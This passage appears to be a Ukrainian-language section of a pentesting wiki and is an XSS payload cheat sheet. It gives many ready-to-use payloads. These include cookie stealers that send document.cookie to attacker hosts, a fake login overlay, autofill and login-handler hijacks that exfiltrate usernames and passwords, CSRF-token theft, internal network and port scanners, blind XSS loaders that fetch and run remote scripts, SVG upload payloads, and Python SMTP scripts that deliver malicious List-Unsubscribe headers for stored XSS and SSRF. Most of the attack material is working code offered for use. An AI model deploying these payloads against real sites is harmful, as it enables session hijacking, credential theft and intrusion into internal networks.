## Поширені XSS payloads

### Кілька payloads в одному


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe пастка

Змушує користувача переміщуватися по сторінці, не виходячи з iframe, та викрадає його дії (включно з інформацією, надісланою у формах):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Отримати Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> Ви **не зможете отримати доступ до cookies з JavaScript**, якщо прапорець HTTPOnly встановлено в cookie. Але тут у вас є [some ways to bypass this protection](../hacking-with-cookies/index.html#httponly), якщо вам пощастить.

### Вкрасти вміст сторінки
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Знайти внутрішні IPs
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Короткі часи вказують на responding port_ _Довші часи вказують на відсутність відповіді._

Перегляньте список ports, заблокованих у Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) і у Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Поле для запиту credentials
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Захоплення автозаповнення паролів
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
When any data is introduced in the password field, the username and password is sent to the attackers server, even if the client selects a saved password and don't write anything the credentials will be ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

Якщо критичний handler (e.g., `function DoLogin(){...}`) оголошено пізніше на сторінці, а ваш payload виконується раніше (наприклад, via an inline JS-in-JS sink), визначте `const` з тим самим ім'ям першим, щоб перехопити і заблокувати handler. Пізніші оголошення функцій не можуть переназначити ім'я `const`, залишаючи ваш hook під контролем:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Примітки
- Це залежить від порядку виконання: ваша ін'єкція повинна виконатися до легітимного оголошення.
- Якщо ваш payload загорнутий у `eval(...)`, прив'язки `const/let` не стануть глобальними. Використайте динамічну ін'єкцію `<script>` з розділу “Deliverable payloads with eval(atob()) and scope nuances”, щоб забезпечити справжню глобальну, незмінну прив'язку.
- Коли фільтри за ключовими словами блокують код, поєднуйте з Unicode-escaped ідентифікаторами або доставкою `eval(atob('...'))`, як показано вище.

### Keylogger

Просто шукаючи на GitHub, я знайшов кілька різних:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- You can also use metasploit `http_javascript_keylogger`

### Крадіжка CSRF токенів
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Викрадення повідомлень PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Зловживання Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Доступ до Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Також можна використати: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Доступ до прихованого вмісту

From [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) можна дізнатися, що навіть якщо деякі значення зникають з JS, їх все ще можна знайти в JS-атрибутах різних об'єктів. Наприклад, введення REGEX все ще можна знайти після того, як значення поля введення regex було видалено:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS Зловживання іншими вразливостями

### XSS in Markdown

Можна інжектувати Markdown-код, який буде відрендерений? Можливо, ви отримаєте XSS! Перевірте:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS to SSRF

Є XSS на **site that uses caching**? Спробуйте **upgrading that to SSRF** через Edge Side Include Injection, використавши цей payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Використовуйте це, щоб обійти обмеження cookie, фільтри XSS та багато іншого!\
Більше інформації про цю техніку тут: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS in dynamic created PDF

Якщо веб-сторінка створює PDF за допомогою введених користувачем даних, можна спробувати **обдурити бота**, який генерує PDF, щоб він **виконав довільний JS код**.\
Отже, якщо **PDF creator bot знаходить** якийсь вид **HTML** **тегів**, він їх буде **інтерпретувати**, і ви можете **зловживати** цією поведінкою, щоб спричинити **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Якщо ви не можете вставити HTML теги, варто спробувати **впровадити дані PDF**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP, спрямований на прискорення продуктивності веб-сторінок на мобільних пристроях, використовує HTML теги, доповнені JavaScript, щоб забезпечити функціональність з акцентом на швидкість і безпеку. Він підтримує набір компонентів для різних можливостей, доступних через [AMP components](https://amp.dev/documentation/components/?format=websites).

Формат [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) розширює певні компоненти AMP для електронних листів, дозволяючи отримувачам взаємодіяти з контентом безпосередньо в листі.

Приклад [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

Заголовок RFC 2369 `List-Unsubscribe` вставляє URI, контрольовані атакуючим, які багато веб-поштових та поштових клієнтів автоматично перетворюють на кнопки "Unsubscribe". Коли ці URI відображаються або витягуються без валідації, заголовок стає точкою ін'єкції як для stored XSS (якщо посилання на відписку розміщене в DOM), так і для SSRF (якщо сервер виконує запит на відписку від імені користувача).

#### Stored XSS via `javascript:` URIs

1. **Відправте собі листа**, де заголовок вказує на URI `javascript:`, при цьому залиште решту повідомлення безпечним, щоб спам-фільтри його не відкинули.
2. **Переконайтесь, що UI відображає значення** (багато клієнтів показують його в панелі "List Info") і перевірте, чи отриманий `<a>` тег успадковує атрибути, контрольовані атакуючим, такі як `href` або `target`.
3. **Спровокуйте виконання** (наприклад, CTRL+click, middle-click або "open in new tab"), коли посилання має `target="_blank"`; браузери оцінять наданий JavaScript в origin веб-поштового додатка.
4. Спостерігайте примітив stored-XSS: payload зберігається разом із листом і для виконання вимагає лише кліку.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Байт нового рядка (`%0a`) у URI показує, що навіть незвичайні символи переживають конвеєр рендерингу у таких вразливих клієнтах, як Horde IMP H5, які виведуть рядок дослівно всередині anchor tag.

<details>
<summary>Minimal SMTP PoC that delivers a malicious List-Unsubscribe header</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Проксі відписки на стороні сервера -> SSRF

Деякі клієнти, наприклад Nextcloud Mail app, проксірують дію відписки на стороні сервера: натискання кнопки наказує серверу самостійно отримати вказаний URL. Це перетворює заголовок на примітив SSRF, особливо коли адміністратори встановлюють `'allow_local_remote_servers' => true` (задокументовано в [HackerOne report 2902856](https://hackerone.com/reports/2902856)), що дозволяє запити до loopback та RFC1918 діапазонів.

1. **Складіть лист**, у якому `List-Unsubscribe` вказує на endpoint, контрольований атакуючим (для blind SSRF використовуйте Burp Collaborator / OAST).
2. **Залиште `List-Unsubscribe-Post: List-Unsubscribe=One-Click`**, щоб UI показував кнопку відписки в один клік.
3. **Виконайте вимоги довіри**: Nextcloud, наприклад, виконує HTTPS-запити відписки лише коли повідомлення проходить DKIM, тому атакуючий має підписати лист за допомогою домену, яким він/вона контролює.
4. **Доставте повідомлення до поштової скриньки, яку обробляє цільовий сервер**, і дочекайтеся, поки користувач натисне кнопку відписки.
5. **Спостерігайте серверний callback** на collaborator endpoint, потім pivot на внутрішні адреси після підтвердження примітива.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>DKIM-підписане List-Unsubscribe повідомлення для тестування SSRF</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Примітки до тестування**

- Використовуйте OAST endpoint для збору blind SSRF hits, потім адаптуйте `List-Unsubscribe` URL, щоб спрямувати його на `http://127.0.0.1:PORT`, служби метаданих або інші внутрішні хости, коли примітив підтверджено.
- Оскільки unsubscribe helper часто повторно використовує той самий HTTP stack, що й застосунок, ви успадковуєте його proxy settings, HTTP verbs та header rewrites, що дозволяє застосувати подальші трюки обходу, описані в [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS — завантаження файлів (svg)

Завантажте як зображення файл на кшталт наведеного нижче (з [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Знайдіть **більше SVG payloads на** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Різні JS трюки та відповідна інформація


{{#ref}}
other-js-tricks.md
{{#endref}}

## Ресурси XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Посилання

- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
